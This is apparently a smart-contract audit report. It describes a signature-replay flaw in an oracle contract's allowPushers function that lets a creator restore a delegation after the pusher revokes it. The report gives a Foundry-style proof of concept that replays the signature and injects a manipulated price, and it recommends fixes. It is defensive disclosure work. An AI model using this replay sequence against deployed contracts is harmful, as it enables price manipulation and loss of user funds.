### Title
Creator Can Replay Pusher Consent Signature After `revokePusher()` to Re-Establish Delegation, Enabling Continued Bad-Price Injection - (File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol)

---

### Summary

`allowPushers` does not consume or invalidate a pusher's consent signature after use. After a pusher calls `revokePusher()` to clear their delegation, the creator can immediately replay the original consent signature (within the deadline window) to re-establish the delegation. This is the oracle analog of the "mint-transfer-mint" bypass: the pusher "mints" consent, "transfers" it away via revocation, and the creator "mints" it again via replay — allowing bad prices to continue flowing into the creator's namespace and downstream into pools.

---

### Finding Description

`CompressedOracleV1.allowPushers` delegates a pusher wallet into the caller's (creator's) namespace by verifying an EIP-191 consent signature from the pusher:

```solidity
// CompressedOracle.sol L192-211
function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
    _ensureDeadline(deadline);
    ...
    bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
    );
    require(pusher == ECDSA.recover(hash, signatures[i]));
    namespaceRemapping[pusher] = msg.sender;
    ...
}
```

The code comment explicitly acknowledges the replay risk and claims the deadline mitigates it:

> *"The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."*

However, the deadline only prevents replay **after** it expires. Within the deadline window, the function has no mechanism to detect that a signature has already been consumed. There is no nonce, no used-signature mapping, and no check on the current state of `namespaceRemapping[pusher]`.

`revokePusher()` clears the mapping:

```solidity
// CompressedOracle.sol L238-243
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
```

But this state change is immediately reversible: the creator holds the original `(deadline, pusher, sig)` tuple and can call `allowPushers` again with identical arguments to restore `namespaceRemapping[pusher] = creator`. The pusher's self-protection mechanism is therefore ineffective against a creator who retains the consent signature.

The `_ensureDeadline` check in `OracleBase`:

```solidity
// OracleBase.sol L124-126
function _ensureDeadline(uint256 deadline) internal view virtual {
    require(block.timestamp <= deadline, DeadlineExceeded());
}
```

only gates on expiry, not on prior use or post-revocation state.

---

### Impact Explanation

The `CompressedOracleV1` is the oracle layer consumed by `PriceProvider._getBidAndAskPrice()` via `IPricedOracle(address(offchainOracle)).price(offchainFeedId, msg.sender)`. Bad prices written into a creator's namespace propagate directly to pool swaps as bid/ask quotes.

Attack path:
1. Pusher P signs consent for creator C with a long deadline (e.g., 30 days).
2. Creator C calls `allowPushers` → `namespaceRemapping[P] = C`.
3. Pusher P's key is compromised; attacker uses P's key to push manipulated prices into C's namespace via `fallback()`.
4. Pusher P (real owner) calls `revokePusher()` → `namespaceRemapping[P] = address(0)`.
5. Creator C (malicious or colluding) calls `allowPushers` with the **same** `(deadline, [P], [sig])` → `namespaceRemapping[P] = C` is restored.
6. Attacker continues pushing bad prices into C's namespace.
7. Any pool registered against C's feeds reads the manipulated bid/ask via `PriceProvider._getBidAndAskPrice()` → bad-price execution, potential loss of user principal.

The `PriceProvider` staleness and price-guard checks do not protect against a fresh, in-range, but manipulated price that passes the timestamp monotonicity gate.

---

### Likelihood Explanation

Requires two conditions to align: (a) the creator is malicious or colluding with the attacker, and (b) the pusher's key is compromised. Creators are semi-trusted parties who control their own namespace. A creator who has a financial incentive to maintain a specific price feed (e.g., to profit from pool mispricing) has a clear motive to replay the consent signature after the pusher attempts to revoke. The deadline window can be arbitrarily long (no cap is enforced on the `deadline` parameter), increasing the exposure window.

---

### Recommendation

Track consumed consent signatures to prevent replay after revocation. Two options:

1. **Nonce per pusher**: Add `mapping(address => uint256) public pusherNonce` and include the nonce in the signed digest. Increment the nonce on each successful `allowPushers` call and on `revokePusher`. A replayed signature will fail because the nonce in the digest no longer matches.

2. **Revocation tombstone**: Add `mapping(address => mapping(bytes32 => bool)) public revokedConsents`. On `revokePusher()`, record the hash of the active consent. In `allowPushers`, reject any signature whose hash is in the tombstone set.

Option 1 is simpler and consistent with the existing EIP-191 pattern.

---

### Proof of Concept

```solidity
// 1. Pusher signs consent for creator with deadline = now + 30 days
uint256 deadline = block.timestamp + 30 days;
bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
);
(uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
bytes memory sig = abi.encodePacked(r, s, v);

// 2. Creator establishes delegation
address[] memory pushers = new address[](1); pushers[0] = pusher;
bytes[] memory sigs = new bytes[](1); sigs[0] = sig;
vm.prank(creator);
oracle.allowPushers(deadline, pushers, sigs);
assertEq(oracle.namespaceRemapping(pusher), creator); // delegated

// 3. Pusher revokes (e.g., key compromised)
vm.prank(pusher);
oracle.revokePusher();
assertEq(oracle.namespaceRemapping(pusher), address(0)); // cleared

// 4. Creator replays the SAME signature — no revert, delegation restored
vm.prank(creator);
oracle.allowPushers(deadline, pushers, sigs); // succeeds
assertEq(oracle.namespaceRemapping(pusher), creator); // re-established

// 5. Attacker (holding pusher key) pushes bad price into creator's namespace
uint56 tsMs = uint56(block.timestamp * 1000);
uint48 badRaw = _packRaw(9_999_999, 0, 0); // manipulated price
vm.prank(pusher); // attacker controls this key
(bool ok,) = address(oracle).call(_wordAt(0, 0, badRaw, tsMs));
assertTrue(ok); // bad price accepted into creator's namespace

// 6. Pool reads bad price via PriceProvider → bad bid/ask execution
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-212)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L236-243)
```text
    /// @notice Allows a pusher to self-revoke their delegation. After revocation the
    ///         wallet pushes into its OWN namespace again (the registrationless default).
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/OracleBase.sol (L124-126)
```text
    function _ensureDeadline(uint256 deadline) internal view virtual {
        require(block.timestamp <= deadline, DeadlineExceeded());
    }
```

**File:** smart-contracts-poc/contracts/PriceProvider.sol (L191-205)
```text
    function _getBidAndAskPrice() internal returns (uint128, uint128) {
        // 1. Read via the unified price(feedId, pool) path, forwarding the pool (msg.sender).
        //    refTime is already in seconds.
        (uint256 mid, uint256 spread, , uint256 refTime) =
            IPricedOracle(address(offchainOracle)).price(offchainFeedId, msg.sender);

        // 2. Staleness check
        if (_isStale(refTime, block.timestamp, MAX_TIME_DELTA)) {
            return (0, type(uint128).max);
        }

        // 3. Basic validity — price must be positive, spread must not be stalled marker
        if (mid == 0 || spread >= ORACLE_BPS) {
            return (0, type(uint128).max);
        }
```
